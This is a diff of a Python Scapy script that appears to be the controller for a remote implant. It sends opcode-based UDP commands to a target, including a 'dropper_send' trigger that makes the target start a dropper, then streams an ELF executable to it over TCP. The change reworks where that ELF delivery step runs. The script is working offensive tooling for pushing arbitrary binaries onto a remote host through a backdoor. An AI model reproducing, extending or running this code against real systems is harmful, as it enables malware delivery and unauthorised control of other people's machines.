@@ -93,43 +93,14 @@ def main():
     parser.add_argument("--dport", type=int, default=12345, help="Destination UDP port")
 
     args = parser.parse_args()
-
-     # --- dropper_send: stream an ELF over TCP, bypassing the UDP path ---
-        # --- dropper_send: UDP trigger, then stream the ELF over TCP ---
-    if args.command == "dropper_send":
-        if not args.arg:
-            parser.error("dropper_send requires an ELF file path")
-
-        # 1. Tell the target to start the dropper (UDP, opcode 6).
-        try:
-            payload = build_payload("dropper_send", args.arg)
-            print("Hex payload:", payload.hex(" "))
-        except ValueError as e:
-            parser.error(str(e))
-
-        pkt = IP(dst=args.ip) / UDP(sport=54321, dport=args.dport) / payload
-        raw_pkt = IP(raw(pkt))
-        if args.iface:
-            send(raw_pkt, iface=args.iface, verbose=False)
-        else:
-            send(raw_pkt, verbose=False)
-        print(f"[+] Sent 'dropper_send' trigger (Opcode 6) to {args.ip}:{args.dport}")
-
-        # 2. Now stream the ELF over TCP.
-        try:
-            send_elf(args.ip, args.arg, port=DROPPER_PORT, iface=args.iface)
-        except (OSError, ValueError) as e:
-            parser.error(str(e))
-        return
     
-    # --- normal UDP command path ---
     try:
         payload = build_payload(args.command, args.arg)
         print("Hex payload:", payload.hex(" "))
     except ValueError as e:
         parser.error(str(e))
 
-    # Construct Layer 3 Packet (macOS handles ARP/Ethernet resolution)
+    # Construct Layer 3 Packet
     pkt = IP(dst=args.ip) / UDP(sport=54321, dport=args.dport) / payload
 
     # Re-serialize to force Scapy to generate valid IP/UDP checksums
@@ -142,6 +113,12 @@ def main():
         send(raw_pkt, verbose=False)
 
     print(f"[+] Sent '{args.command}' (Opcode {COMMAND_MAP[args.command]['opcode']}) to {args.ip}:{args.dport}")
+
+    if args.command == "dropper_send":
+        try:
+            send_elf(args.ip, args.arg, port=DROPPER_PORT, iface=args.iface)
+        except (OSError, ValueError) as e:
+            parser.error(str(e))
 
 if __name__ == "__main__":
     main()
